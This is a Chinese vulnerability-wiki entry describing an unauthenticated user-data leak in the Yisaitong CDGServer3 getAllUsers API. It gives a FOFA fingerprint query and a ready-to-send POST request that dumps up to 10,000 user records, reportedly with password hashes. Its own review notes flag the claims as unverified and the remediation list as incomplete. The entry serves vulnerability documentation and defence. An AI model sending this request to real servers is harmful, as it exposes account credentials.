---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "亿赛通CDGServer3 openapi getAllUsers信息泄露"
product: "亿赛通CDGServer3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；返回用户表范围待证"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E5%BF%86%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20getAllUsers%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/CDGServer3/index.jsp\""
id: "vw-5103638a373c1c4c64316d6e"
entity_id: "ve-5103638a373c1c4c64316d6e"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 亿赛通CDGServer3 openapi getAllUsers信息泄露

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：亿赛通CDGServer3；openapi getAllUsers信息泄露
- 版本、配置及部署条件：版本未知；返回用户表范围待证
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 厂商名忆赛通错写亿赛通；无实际响应，无法确认密码字段/加密格式
- MD5是哈希不叫解密，破解不保证成功；后台登录不自动等于加密文件可解密泄露
- pageSize10000可能大量返回用户资料，建议最小化证据
- 在野已知/严重/资产大皆无出处，Accept换行损坏HTTP，修复列表残空项

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

亿赛通电子文档安全管理系统 /CDGServer3/openapi/getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，MD5 属于单向哈希，不能直接“解密”；能否通过猜测匹配恢复弱口令、登录后台或读取加密文档，分别需要额外证据和权限前提。

影响版本

亿赛通电子文档安全管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 严重 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/CDGServer3/index.jsp"

POC/EXP：

```http
POST /CDGServer3/openapi/getAllUsers HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/x-www-form-urlencoded

pageSize=10000&pageNumber=1
```

资产数量大。泄露机密加密文件，请及时排查通告。

## 修复方案

1. 设置安全组仅对可信地址开放

   升级至安全版本
   
1.


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
